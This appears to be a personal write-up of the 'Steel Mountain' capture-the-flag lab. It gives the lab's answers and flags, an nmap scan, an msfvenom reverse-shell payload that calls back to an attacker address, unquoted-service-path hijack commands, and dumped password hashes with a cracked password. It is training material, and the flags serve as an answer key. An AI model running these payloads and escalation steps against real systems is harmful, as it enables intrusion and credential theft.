# Steel Mountain
##### Question 1: Who is the employee of the month?
Answer
```bash
Bill Harper
```

##### Question 2: Scan the machine with nmap. What is the other port running a web server on?
Answer
```bash
8080
```

##### Question 3: Take a look at the other web server. What file server is running?
Answer
```bash
Rejetto HTTP File Server
```

##### Question 4: What is the CVE number to exploit this file server?
Answer
```bash
CVE 2014-6287
```

##### Question 5: Use Metasploit to get an initial shell. What is the user flag?
Answer
```bash
b04763b6fcf51fcd7c13abc7db4fd365
```

##### Question 6: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
Answer
```bash
AdvancedSystemCareService9
```

##### Question 7: What is the root flag?
Answer
```bash
9af5f314f57607c00fd09803a587db80
```

##### Question 8: What powershell -c command could we run to manually find out the service name? 
Answer
```bash
powershell -c Get-Service
```

- - - - - - - -  - - -  - - - - - - - - - - - - - - - - - - -- - - - 

Nmap Scan:
```nmap
Nmap scan report for 10.10.247.87
Host is up (0.091s latency).
Not shown: 65496 closed ports, 26 filtered ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2021-12-15T00:52:10
|_Not valid after:  2022-06-16T00:52:10
|_ssl-date: 2021-12-16T01:08:25+00:00; +1s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  tcpwrapped
49153/tcp open  tcpwrapped
49154/tcp open  tcpwrapped
49155/tcp open  tcpwrapped
49156/tcp open  tcpwrapped
49163/tcp open  tcpwrapped
49164/tcp open  tcpwrapped

Network Distance: 5 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-16T01:07:59
|_  start_date: 2021-12-16T00:52:03

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   38.04 ms  10.6.0.1
2   ... 4
5   106.96 ms 10.10.247.87
```

BillHarper Picture:
![[Pasted image 20211215190842.png]]

File Server Screenshot:
![[Pasted image 20211215190740.png]]

Unqouted Service Path:
![[Pasted image 20211215192438.png]]

Priv Esc Commands:
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.6.32.32 LPORT=5555 -f exe -o Advanced.exe

upload Advanced.exe
shell

net stop AdvancedSystemCareService9
cd "C:\Program Files (x86)\IObit"
move C:\users\bill\Desktop\Advanced.exe

~run listener

net start AdvancedSystemCareService9
```

Hashdump:
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:53dbf27b0f37b1ef784c8a4768c0e9fa:::
bill:1001:aad3b435b51404eeaad3b435b51404ee:a3c2a771303f6e954077bcc663e89213:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

bill:PMBAf5KhZAxVhvqb